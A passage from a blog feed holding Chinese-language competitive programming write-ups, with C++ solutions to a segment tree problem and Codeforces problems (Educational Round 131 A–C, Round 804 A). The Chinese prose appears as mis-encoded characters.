class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;p);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,a+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">signed</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">signed</span> op,l,r,num;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        <span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            <span class="built_in">mul</span>(l,r,num,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            <span class="built_in">add</span>(l,r,num,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">            ans=<span class="number">0</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;l=%d r=%d\n&quot;,l,r);</span></span><br><span class="line">            <span class="built_in">query</span>(l,r,<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> æ•°æ®ç»“æ„ </category>
          
          <category> çº¿æ®µæ ‘ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Educational Codeforces Round 131(Div.2)è§£æ</title>
      <link href="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/"/>
      <url>/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©æ‰å¤§åˆ†ï¼Œé¢„ä¼°å›é’åå§ã€‚å®æ—¶<a href="https://www.bilibili.com/video/BV1KN4y1u7qB">å½•å±</a></p><span id="more"></span><h2 id="A-Grass-Field"><a href="#A-Grass-Field" class="headerlink" title="A. Grass Field"></a>A. Grass Field</h2><h3 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™å®š2Ã—2çš„è‰åœ°ï¼Œä¸€æ¬¡æ“ä½œèƒ½ä»»æ„æ¸…é™¤ä¸‰å—è‰åœ°ï¼Œé—®æœ€å¤šå‡ æ¬¡æ¸…é™¤æ‰€æœ‰è‰åœ°ã€‚é‚£å°±åˆ¤æ–­è‰åœ°ä¸ªæ•°ï¼Œåªæœ‰å…¨æ˜¯è‰åœ°çš„æ—¶å€™æ‰è¦ä¸¤æ¬¡ï¼Œæ²¡æœ‰è‰åœ°çš„æ—¶å€™ä¸€æ¬¡ä¸ç”¨ï¼Œå…¶ä½™æƒ…å†µéƒ½æ˜¯ä¸€æ¬¡ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>,a,a+<span class="number">1</span>,a+<span class="number">2</span>,a+<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">int</span> sum=a[<span class="number">1</span>]+a[<span class="number">2</span>]+a[<span class="number">3</span>]+a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(sum==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sum!=<span class="number">4</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Permutation"><a href="#B-Permutation" class="headerlink" title="B. Permutation"></a>B. Permutation</h2><h3 id="é¢˜ç›®æè¿°ï¼š-1"><a href="#é¢˜ç›®æè¿°ï¼š-1" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦è®©æ’åˆ—ä¸­çš„ä¸€ä¸ªå€¼ï¼ˆè¿™ä¸ªå€¼æ˜¯<code>a[i+1]/a[i]</code>ï¼‰å°½å¯èƒ½å¤šçš„å‡ºç°ï¼Œä¸€æ ·å¤šçš„æƒ…å†µä¸‹è¾“å‡ºå€¼è¾ƒå¤§çš„ã€‚è¿™é¢˜è´ªå°±å®Œäº†ï¼Œæˆ‘ä»¬é•¿åº¦è¶…è¿‡4çš„æˆ‘ä»¬å°±é€‰2ã€‚ä»1å¼€å§‹2å€å»å¡«ä¸Šæ•°ï¼Œå†é€‰æ²¡å¡«è¿‡çš„ï¼Œä¹Ÿæ˜¯2å€2å€è¾“å‡ºï¼Œè¿™æ ·å°±è¾¾åˆ°äº†æœ€ä¼˜çŠ¶æ€ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;2\n1 2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;3\n2 1 3&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="number">1</span>)&#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=n;j*=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,j);</span><br><span class="line">            a[j]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>mä¸ªå·¥ä½œï¼Œnä¸ªäººï¼Œæ¯ä¸ªå·¥ä½œæœ‰ä¸€ä¸ªç†Ÿç»ƒå·¥ï¼Œå¦‚æœè®©ç†Ÿç»ƒå·¥å®Œæˆï¼Œé‚£ä¹ˆåªéœ€è¦ä¸€ä¸ªå°æ—¶ï¼Œè®©å…¶ä½™å·¥äººå®Œæˆéƒ½éœ€è¦ä¸¤ä¸ªå°æ—¶ã€‚</p><p>æˆ‘ä»¬ç›´æ¥äºŒåˆ†ç­”æ¡ˆå°±è¡Œäº†ï¼Œè‡³äºcheckå‡½æ•°ï¼Œæˆ‘ä»¬å°±å…ˆè®¡ç®—æ¯ä¸ªå·¥äººçš„ç†Ÿç»ƒå·¥ä½œä¸ªæ•°ã€‚</p><p>ç„¶ååšå‡ºå¦‚ä¸‹ç®—æ³•ï¼š</p><ol><li>å¯¹äºä¸€ä¸ªäººï¼Œè‹¥å®ƒç†Ÿç»ƒa[i]ç§å·¥ä½œï¼Œé‚£ä¹ˆå®ƒä¼šå°½é‡èŠ±è´¹a[i]çš„æ—¶é—´å»åšå®Œè¿™a[i]çš„å·¥ä½œï¼Œè‹¥æ—¶é—´æœ‰å‰©ï¼Œé‚£ä¹ˆå‰©ä½™æ—¶é—´åš <code>(t-a[i])/2</code> ä¸ªå·¥ä½œã€‚</li><li>åˆ¤æ–­nä¸ªå·¥äººåœ¨tæ—¶é—´å†…æ˜¯å¦èƒ½å®Œæˆmé¡¹å·¥ä½œåªéœ€æŠŠå·¥äººæŒ‰ç…§ä»¥ä¸Šç®—æ³•åŠ èµ·æ¥ï¼Œåˆ¤æ–­ä¸€ä¸‹å¤§å°å°±è¡Œäº†ã€‚</li></ol><p>æ—¶é—´ä¸ŠäºŒåˆ†ï¼Œé€‰æ‹©æœ€å¤§å¯èƒ½æ—¶é—´ï¼Œæœ€å¤§å¯èƒ½æ—¶é—´å°±æ˜¯æŠŠæ‰€æœ‰äººéƒ½å½“åœºä¸ç†Ÿç»ƒå·¥è®¡ç®—å°±å¥½äº†ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m,t;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;a[%d]=%d\n&quot;,i,a[i]);</span></span><br><span class="line"><span class="comment">//        if(!a[i])&#123;</span></span><br><span class="line"><span class="comment">//            break;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;t)&#123;</span><br><span class="line">            ans+=a[i];</span><br><span class="line">            ans+=(t-a[i])/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans+=t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;time=%d ans=%d\n&quot;,t,ans);</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        a[x]++;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line">    t=(m/n)*<span class="number">2</span>+(!!(m%n))*<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">1</span>,r=t;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//printf(&quot;mid=%d\n&quot;,mid);</span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="built_in">cal</span>(mid);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(res&lt;m)&#123;</span><br><span class="line">            l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,l);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å•¥ä¹Ÿä¸è¯´äº†ï¼ŒçŒ›ç»ƒå§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> é¢˜è§£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>codeforces round 804(div2)è§£æ</title>
      <link href="/2022/07/05/Codeforces%20Round%20804(Div.2)/"/>
      <url>/2022/07/05/Codeforces%20Round%20804(Div.2)/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡æ‰“è¿‡cfäº†ï¼Œä»Šå¤©é‡æ¸©ä¸€ä¸‹ï¼Œå¯èƒ½æ‰‹æ¯”è¾ƒç”Ÿäº†ï¼Œæ‰“å¾—çŠ¶æ€ä¸å¤ªå¥½ã€‚å®æ—¶<a href="https://www.bilibili.com/video/BV1xB4y1W79t/">å½•å±</a></p><span id="more"></span><h2 id="A-The-Third-Three-Number-Problem"><a href="#A-The-Third-Three-Number-Problem" class="headerlink" title="A. The Third Three Number Problem"></a>A. The Third Three Number Problem</h2><h3 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¢˜æ„æ¯”è¾ƒç®€å•ï¼Œç»™å®šä¸€ä¸ªæ•°ï¼Œæ„é€ ä¸‰ä¸ªæ•°ä½¿å¾— <code>a^b+b^c+c^a==n</code>ã€‚é¦–å…ˆä¸éš¾æƒ³åˆ°ï¼Œå¥‡æ•°ä¸€å®šæ— æ³•æ„é€ ï¼Œå› ä¸ºå¥‡æ•°å¼‚æˆ–å¶æ•°ç»“æœä¸€å®šä¸ºå¥‡æ•°ï¼Œå¥‡æ•°ä¸å¥‡æ•°ä»¥åŠå¶æ•°ä¸å¶æ•°å¼‚æˆ–ç»“æœä¸€å®šä¸ºå¶æ•°ï¼Œåˆ™æˆ‘ä»¬æœ‰ä»¥ä¸‹ç»“è®ºï¼š</p><ul><li>è‹¥ä¸‰ä¸ªæ•°ä¸­æ²¡æœ‰å¥‡æ•°ï¼Œåˆ™ç›¸äº’å¼‚æˆ–å’Œä¸€å®šä¸ºå¶æ•°ã€‚</li><li>è‹¥ä¸‰ä¸ªæ•°ä¸­åªæœ‰ä¸€ä¸ªå¥‡æ•°ï¼Œåˆ™å¼‚æˆ–çš„ç»“æœä¼šäº§ç”Ÿ2ä¸ªå¥‡æ•°ï¼Œä¸€ä¸ªå¶æ•°ï¼Œæœ€ç»ˆå’Œä»ä¸ºå¶æ•°ã€‚</li><li>è‹¥ä¸‰ä¸ªæ•°ä¸­æœ‰ä¸¤ä¸ªå¥‡æ•°ï¼Œåˆ™å¼‚æˆ–çš„ç»“æœäº§ç”Ÿ2ä¸ªå¥‡æ•°ï¼Œä¸€ä¸ªå¶æ•°ï¼Œæœ€ç»ˆå’Œä¹Ÿä¸ºå¶æ•°ã€‚</li><li>è‹¥ä¸‰ä¸ªæ•°å…¨æ˜¯å¥‡æ•°ï¼Œåˆ™å¼‚æˆ–çš„ç»“æœäº§ç”Ÿå…¨ä¸ºå¶æ•°ï¼Œæœ€ç»ˆç»“æœä¹Ÿæ˜¯å¶æ•°ã€‚</li></ul><p>ä¸éš¾å‘ç°æˆ‘ä»¬æœ€ç»ˆç»“æœå¿…æ˜¯å¶æ•°ã€‚</p><p>é‚£ä¹ˆå¦‚æœä¸æ˜¯å¶æ•°é‚£ä¹ˆç›´æ¥è¾“å‡º-1ï¼Œè‹¥æ˜¯åˆ™æˆ‘ä»¬ä»¤å…¶ä¸­ä¸¤ä¸ªæ•°ä¸º1ï¼Œé‚£ä¹ˆæœ€ç»ˆç»“æœå°±æ˜¯ <code>n=1^1+1^x+1^x=2*(1^x)</code>ã€‚æˆ‘ä»¬éå¸¸å®¹æ˜“èƒ½è§£å‡º <code>x</code> çš„å€¼ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 